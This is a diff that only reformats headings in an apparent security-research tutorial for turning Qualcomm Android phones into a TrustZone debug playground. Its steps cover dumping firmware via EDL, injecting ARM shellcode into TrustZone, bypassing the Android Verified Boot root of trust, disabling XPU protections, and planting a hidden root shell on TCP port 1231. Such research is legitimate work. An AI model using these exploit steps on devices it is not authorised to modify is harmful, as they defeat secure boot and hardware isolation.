@@ -1,7 +1,7 @@
 # Setting up a Qualcomm Trustzone Aarch64 Debug Playground for Android
 ## Part 1
 
-##### Introduction
+### Introduction
 
 TLDR: 
 
@@ -29,8 +29,8 @@ Requirements :
 <br/>
 <br/>
 
-##### 1. Verifying if the device is vulnerable to cold-patching
-1.1. Install latest adb and fastboot
+#### 1. Verifying if the device is vulnerable to cold-patching
+##### 1.1. Install latest adb and fastboot
   ```
   ~ $ mkdir ~/bin
   ~ $ cd ~/bin
@@ -39,7 +39,7 @@ Requirements :
   ```
   adb should be available after rebooting the host pc (if path is included in ~/.profile)
   
-1.2. Install my qualcomm emergency download tools (edl)
+##### 1.2. Install my qualcomm emergency download tools (edl)
   ``` 
   ~ $ git clone https://github.com/bkerler/EDL edl
   ~ $ cd edl
@@ -50,7 +50,7 @@ Requirements :
   ~/edl $ sudo udevadm control -R
   ```
 
-1.3. Grab any EDL Loader matching your device (from firmware) and put it into the "Loaders" directory 
+##### 1.3. Grab any EDL Loader matching your device (from firmware) and put it into the "Loaders" directory 
      and rename it to match the displayed structure [msmid]_[pkhash 8 bytes].bin or use the provided 
      fhloaderparse.py script.
     
@@ -73,10 +73,10 @@ Requirements :
       ```
   
  
-1.4. Power off the smartphone, press volume down and volume up and
+##### 1.4. Power off the smartphone, press volume down and volume up and
      connect the usb cable. The device should enter the 9008 mode.
 
-1.5. Verify if the device is vulnerable to cold-patching qualcomm firmware :
+##### 1.5. Verify if the device is vulnerable to cold-patching qualcomm firmware :
       ```
       ~/edl $ ./edl.py -secureboot
     
@@ -115,9 +115,9 @@ Requirements :
 <br/>
 <br/>
 
-##### 2. Getting device firmware
+#### 2. Getting device firmware
 
-###### Dump directly from the device
+##### 2.1 Dump directly from the device
 - Dump the stock device boot, aboot and tz partition :
   ```
   ~/edl $ ./edl.py -r boot boot.img
@@ -151,7 +151,7 @@ Requirements :
   ~/edl $ cd ..
   ```
 
-###### or getting the device firmware to attack
+##### or getting the device firmware to attack
 - 64 Bit BQ Aquaris X Pro MSM8953
     2.7.2_20190620-1410-bardockpro_bq-user-2169-Fastboot-FW.zip
     ```
@@ -168,14 +168,14 @@ Requirements :
 <br/>
 
 
-##### 3. Getting my qc attack framework and installing it
-3.1. Grabbing the latest version of my attack tools
+#### 3. Getting my qc attack framework and installing it
+##### 3.1. Grabbing the latest version of my attack tools
   ```
   ~ $ git clone https://github.com/bkerler/qcpatchtools
   ~ $ cd qcpatchtools
   ```
 
-3.2. Install capstone + keystone engine:
+##### 3.2. Install capstone + keystone engine:
     ```
     
     ~/qcpatchtools $ git clone https://github.com/keystone-engine/keystone --recursive
@@ -198,12 +198,12 @@ Requirements :
     ~/qcpatchtools $ rm -rf capstone
     ```
   
-3.3. Install requirements :
+##### 3.3. Install requirements :
    ```
    ~/qcpatchtools $ sudo pip3 install -r requirements.txt
    ```
 
-3.4. Now we can leave the qcpatchtools folder.
+##### 3.4. Now we can leave the qcpatchtools folder.
   ```
   ~/qcpatchtools $ cd ~
   ```
@@ -212,10 +212,10 @@ Requirements :
 <br/>
 
 
-##### 4. Modding the stock kernel
+#### 4. Modding the stock kernel
 
-###### 64 Bit BQ Aquaris X Pro MSM8953
-4.1. Grab the latest kernel matching your device firmware version
+##### 64 Bit BQ Aquaris X Pro MSM8953
+###### 4.1. Grab the latest kernel matching your device firmware version
   ```
   ~ $ git clone https://github.com/bq/aquaris-X-Pro.git
   ~ $ mv aquaris-X-Pro kernel
@@ -229,14 +229,14 @@ Requirements :
   ~ $ mkdir KERNEL_OUT
   ```
 
-4.2. Grab my fancy patch which adds custom svc handler (see Gal Beniamini's Blog) but
+###### 4.2. Grab my fancy patch which adds custom svc handler (see Gal Beniamini's Blog) but
 also removes xpu restrictions and adds additional logging of tz svc
 
   ```
   ~ $ patch -p1 -d kernel < qcpatchtools/patches/kernel_bq_msm8953.diff
   ```
 
-4.3. Compile the custom kernel
+###### 4.3. Compile the custom kernel
   ```
   ~ $ make -C kernel O=../KERNEL_OUT ARCH=arm64 CROSS_COMPILE=../aarch64-linux-android-4.9 bardockpro_defconfig
   ~ $ make -j4 O=../KERNEL_OUT/ -C kernel ARCH=arm64 CROSS_COMPILE=../aarch64-linux-android-4.9/bin/aarch64-linux-android-
@@ -245,8 +245,8 @@ also removes xpu restrictions and adds additional logging of tz svc
 
 <br/>
 
-###### 32 Bit Oneplus One MSM8974
-4.1. Grab the latest kernel matching your device firmware version
+##### 32 Bit Oneplus One MSM8974
+###### 4.1. Grab the latest kernel matching your device firmware version
   ```
   ~ $ git clone https://github.com/LineageOS/android_kernel_oneplus_msm8974 -b cm-13.0 kernel
   ~ $ git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9
@@ -256,13 +256,13 @@ also removes xpu restrictions and adds additional logging of tz svc
   ~ $ mkdir KERNEL_OUT
   ```
 
-4.2. Grab my fancy patch which adds custom svc handler (see Gal Beniamini's Blog) but
+###### 4.2. Grab my fancy patch which adds custom svc handler (see Gal Beniamini's Blog) but
   also removes xpu restrictions and adds additional logging of tz svc
   ```
   ~ $ patch -p1 -d kernel < qcpatchtools/patches/kernel_oneplus_msm8974.diff
   ```
 
-4.3. Compile the custom kernel
+###### 4.3. Compile the custom kernel
   ```
   ~ $ make -C kernel O=../KERNEL_OUT ARCH=arm CROSS_COMPILE=../arm-linux-androideabi-4.9 cyanogenmod_bacon_defconfig
   ~ $ make -j4 O=../KERNEL_OUT/ -C kernel ARCH=arm CROSS_COMPILE=../arm-linux-androideabi-4.9/bin/arm-linux-androideabi-
@@ -274,19 +274,19 @@ also removes xpu restrictions and adds additional logging of tz svc
 <br/>
 <br/>
 
-##### 5. Rooting the stock kernel
+#### 5. Rooting the stock kernel
 
 In order to have our own rooted kernel we add our own
 reverse shell via adb to enable tz debugging on a locked 
 retail BQ X smartphone using my Android_Universal and EDL
 Scripts
 
-5.1. Install the android_universal toolkit
+##### 5.1. Install the android_universal toolkit
 ```
 ~ $ git clone https://github.com/bkerler/android_universal
 ```
    
-5.2. Root the stock image and add a fake root (in order to bypass
+##### 5.2. Root the stock image and add a fake root (in order to bypass
   AVBv1 Root of Trust):
 ```
   ~ $ cd edl
@@ -294,7 +294,7 @@ Scripts
   ~/edl $ cd ~/android_universal
 ```
   
-  ###### 32 Bit Oneplus One MSM8974
+###### 32 Bit Oneplus One MSM8974
   The Oneplus One is signed by google test loaders, so you can flash directly
   the boot.img.signed file. 
   ```
@@ -303,14 +303,14 @@ Scripts
    
    <br/>
    
-   ###### 64 Bit BQ Aquaris X Pro MSM8953
+###### 64 Bit BQ Aquaris X Pro MSM8953
    As the MSM8953 devices implement Android Verified Boot v1, you will need
    to flash the file called "boot.img.rotfake".
    ```
    ~/android_universal $ ./makeramdisk.sh -fn boot.img -c
    ```
 
-5.3. The makeramdisk tool will halt for adding custom files to the boot image. In another shell, run :
+##### 5.3. The makeramdisk tool will halt for adding custom files to the boot image. In another shell, run :
 ```
 ~/android_universal $ cp ../zkernel tmp/kernel 
 ~/android_universal $ cd ..     
@@ -321,10 +321,10 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
 <br/>
 <br/>
 
-##### 6. Prepare tz shellcode for code injection (either cold patch or hot patch)
+#### 6. Prepare tz shellcode for code injection (either cold patch or hot patch)
 
-6.1. Save the appropriate shellcode into a file "shellcode.txt"
-   ###### 32 Bit Oneplus One MSM8974
+##### 6.1. Save the appropriate shellcode into a file "shellcode.txt"
+###### 32 Bit Oneplus One MSM8974
       ```
       # R0 = writeflag (0=read, 0x22=write), R1=addr, R2=value, R3=readmemptr
       PUSH {R4-R6,LR}
@@ -341,7 +341,7 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
    
    <br/>
 
-   ###### 64 Bit BQ Aquaris X Pro MSM8953  
+###### 64 Bit BQ Aquaris X Pro MSM8953  
       ```
       # X0 = writeflag (0=read, 0x22=write), R1=addr, R2=value
       STP X28, X27, [SP,#-0x60]!
@@ -374,8 +374,8 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
 <br/>
 <br/>
 
-##### 7. Patching tz to allow code injection by injecting our shellcode
-7.1. Coldpatching the tz with our own shellcode into a codecave
+#### 7. Patching tz to allow code injection by injecting our shellcode
+##### 7.1. Coldpatching the tz with our own shellcode into a codecave
 
    ```
    ~ $ cd qcpatchtools
@@ -383,7 +383,7 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
    
    <br/>
      
-   ###### 32 Bit Oneplus One MSM8974
+###### 32 Bit Oneplus One MSM8974
    ```
    ~/qcpatchtools $ ../tz_coldpatch32.py -in tz.mbn -out tz.patched -sc shellcode.txt 
         Found svc_entry_offset: 0xfe826104.
@@ -395,7 +395,7 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
    
    <br/>
     
-   ###### 64 Bit BQ Aquaris X Pro MSM8953 
+###### 64 Bit BQ Aquaris X Pro MSM8953 
    ```
       ~/qcpatchtools $ ./tz_coldpatch64.py -in ../edl/tz.img -out tz.img.patched -sc shellcode.txt
         Found code cave at 0x8657871c, file offset: 0x5c71c, svc code: 0x0200020D
@@ -405,7 +405,7 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
 
 <br/>
   
-7.2. Sign the tz.bin using own generated private key
+##### 7.2. Sign the tz.bin using own generated private key
   ```
   ~/qcpatchtools $ ./qc_signer.py -t qsee -in tz.img.patched -out tz.signed
   ```
@@ -413,17 +413,17 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
 <br/>
 <br/>
 
-##### 8. Patching aboot to allow custom ramdisk (only needed for devices with AVB, skip this step for OnePlus MSM8974)
- 8.1. Patching aboot
+#### 8. Patching aboot to allow custom ramdisk (only needed for devices with AVB, skip this step for OnePlus MSM8974)
+##### 8.1. Patching aboot
  
  <br/>
  
-  ###### 32 Bit Oneplus One MSM8974
+###### 32 Bit Oneplus One MSM8974
   - Not needed
  
  <br/>
   
-  ###### 64 Bit BQ Aquaris X Pro MSM8953 
+###### 64 Bit BQ Aquaris X Pro MSM8953 
   - Coldpatch aboot to bypass root of trust
     ```
     ~/qcpatchtools $ ./aboot_rot64.py -in ../edl/aboot.img -out aboot.patched
@@ -437,20 +437,20 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
 <br/>
 <br/>
 
-##### 9. Flashing modded files
+#### 9. Flashing modded files
 
 <br/>
 
-###### 32 Bit Oneplus One MSM8974
+##### 32 Bit Oneplus One MSM8974
 
-  9.1. Copy patched boot and tz to the EDL directory
+###### 9.1. Copy patched boot and tz to the EDL directory
   ```
   ~/qcpatchtools $ cp tz.signed ../edl/ && cd ..
   ~/qcpatchtools $ cd ..
   ~ $ cp android_universal/boot.img.signed edl/
   ```
   
-  9.2. Power off the smartphone (reboot keeping 
+###### 9.2. Power off the smartphone (reboot keeping 
     volume down + power pressed), press volume down and volume up and
     connect the usb cable. The device should enter the 9008 mode.
   ```
@@ -460,12 +460,12 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
   ```
   - Reboot the device, it should be rooted
 
-  9.3. Reboot the device, it should be rooted
+###### 9.3. Reboot the device, it should be rooted
 
 <br/>
 
-###### 64 Bit BQ Aquaris X Pro MSM8953  
-  9.1. Copy patched boot, tz and aboot to the EDL directory
+##### 64 Bit BQ Aquaris X Pro MSM8953  
+###### 9.1. Copy patched boot, tz and aboot to the EDL directory
   ```
   ~/edl $ cd ~
   ~ $ cp qcpatchtools/aboot.signed qcpatchtools/tz.signed ../edl/
@@ -473,7 +473,7 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
   ~ $ cd /edl
   ```
   
-  9.2. Power off the smartphone (reboot keeping 
+###### 9.2. Power off the smartphone (reboot keeping 
     volume down + power pressed), press volume down and volume up and
     connect the usb cable. The device should enter the 9008 mode.
   ```
@@ -482,7 +482,7 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
   ~/edl $ ./edl.py -w tz tz.signed
   ~/edl $ cd ..
   ```
- 9.3. If the device reboots and enters usb pid 0x900E or 0x9006,
+###### 9.3. If the device reboots and enters usb pid 0x900E or 0x9006,
      open up the device, remove the battery connector and usb cable,
      short emmc clk pin to ground, connect usb cable, remove the short,
      and connect the battery connector. The device should then enter 
@@ -493,9 +493,9 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
 <br/>
 <br/>
 
-##### 10. Testing if device is rooted :D
-10.1. TZ failure unbricking process:
-  ###### In case the device reboots all the time into 0x9006 mode:
+#### 10. Testing if device is rooted :D
+##### 10.1. TZ failure unbricking process:
+###### In case the device reboots all the time into 0x9006 mode:
    ```
    ~/edl $ ./edl.py -vid 0x05c6 -pid 0x9006
    ```
@@ -524,7 +524,7 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
 
 <br/>
 
-  ####### In case the device reboots all the time into 0x900E mode:
+###### In case the device reboots all the time into 0x900E mode:
   - If the device doesn't boot (red light) and enters usb pid
     0x900E mode, it means the signature was invalid. You will
     then need to short DAT0 with GND on boot of the
@@ -537,14 +537,14 @@ Then press enter in the makeramdisk tool to let it finish making and signing the
 
 <br/>
 
-10.2. Copy the custom adb key (any other will be refused):
+##### 10.2. Copy the custom adb key (any other will be refused):
   
   ```
   ~ $ cd ../android_universal
   ~/android_universal $ ./install_adb_key.sh
   ```
 
-10.3. To get a root shell, you need to connect to the hidden
+##### 10.3. To get a root shell, you need to connect to the hidden
         root shell via tcp port 1231 on the device. You won't 
         see a prompt, so just enter your command and press enter.
         
@@ -584,11 +584,11 @@ root@bardock:/ # getprop | grep 8.1
 <br/>
 <br/>
 
-##### 11. Talk to the tz (reading tz memory)
+#### 11. Talk to the tz (reading tz memory)
 
 <br/>  
 
-  ###### 32 Bit Oneplus One MSM8974
+##### 32 Bit Oneplus One MSM8974
   - Read memory dword from within the tz (Address: 0xFE82CDA0)
   
   ```
@@ -604,7 +604,7 @@ root@bardock:/ # getprop | grep 8.1
  
  <br/>
  
-  ###### 64 Bit BQ Aquaris X Pro MSM8953
+##### 64 Bit BQ Aquaris X Pro MSM8953
   - Read memory dword from within the tz (Address: 0x8657871c)
   
   ```
@@ -622,13 +622,13 @@ root@bardock:/ # getprop | grep 8.1
 <br/>
 <br/>
 
-##### 12. Hot patch tz (writing to code cave)
+#### 12. Hot patch tz (writing to code cave)
 
   <br/>
 
-  ###### 32 Bit Oneplus One MSM8974
+##### 32 Bit Oneplus One MSM8974
  
-   12.1. Disabling XPU
+###### 12.1. Disabling XPU
    
    ```
         root@bacon:/ # /data/local/tmp/qcxploit svcreg32 03 06 03 0x22 0xFC48B080 0x0
@@ -644,7 +644,7 @@ root@bardock:/ # getprop | grep 8.1
         Done exploiting
    ```
    
-   12.2. Reading / Writing
+###### 12.2. Reading / Writing
    - Reading dword
        ```
        root@bacon:/ # /data/local/tmp/qcxploit svcreg32 03 06 03 0x0 0x[addr_to_read] 0x[bufferaddr]
@@ -665,7 +665,7 @@ root@bardock:/ # getprop | grep 8.1
        root@bacon:/ # /data/local/tmp/qcxploit writemem [addr_to_write] [value_to_write_as_hexstring]
        ```
      
-   12.2. Generating shellcode
+###### 12.3. Generating shellcode
    
    ```
         ~/qcpatchtools ~ Tools/asmtools.py -asm arm,thumb -in ShellCode/shellcode_examples/read_write_shellcode_arm.txt 
@@ -673,13 +673,13 @@ root@bardock:/ # getprop | grep 8.1
             70b5222802d00868106000e00a6070bd
    ```
         
-   12.3. Injecting shellcode (0xfe809c8d is your code cave offset from 7.1.)
+###### 12.4. Injecting shellcode (0xfe809c8d is your code cave offset from 7.1.)
    
    ```
         root@bacon:/data/local/tmp # ./qcxploit writemem FE809C8D 70b5222802d00868106000e00a6070bd
    ```
     
-   12.4. Running injected shellcode :
+###### 12.5. Running injected shellcode :
    
    ```
         root@bacon:/data/local/tmp # ./qcxploit svcreg32 06 03 03 0 0xFE808796 0xFE82830c
@@ -690,12 +690,12 @@ root@bardock:/ # getprop | grep 8.1
            70B5042B
    ```
 
-   12.5. For faults, see /d/tzdbg/log
+###### 12.6. For faults, see /d/tzdbg/log
   
   <br/>
   
-  ###### 64 Bit BQ Aquaris X Pro MSM8953
-   12.1. Disabling XPU
+##### 64 Bit BQ Aquaris X Pro MSM8953
+###### 12.1. Disabling XPU
         
    - Disable HWIO_BIMC_S_DDR0_XPU_SCR_ADDR (optional, however disables tz key)
      ```
@@ -725,13 +725,13 @@ root@bardock:/ # getprop | grep 8.1
      root@bardock:/ # ./qcxploit svcreg 200020D 4 22 44a340 866f0000 0
      ```
           
-   12.2. Enable debug logs from tz
+###### 12.2. Enable debug logs from tz
    ```
    root@bardock:/ # mount -t debugfs debugfs /d/
    root@bardock:/ # ls /d/tzdbg
    ```
           
-   12.3. We can now upload any code using devmem directly to the tz
+###### 12.3. We can now upload any code using devmem directly to the tz
          (here: write code to tz for svc cmd 0x200030F)
    ```     
    root@bardock:/ # ./busybox devmem 0x865ef918
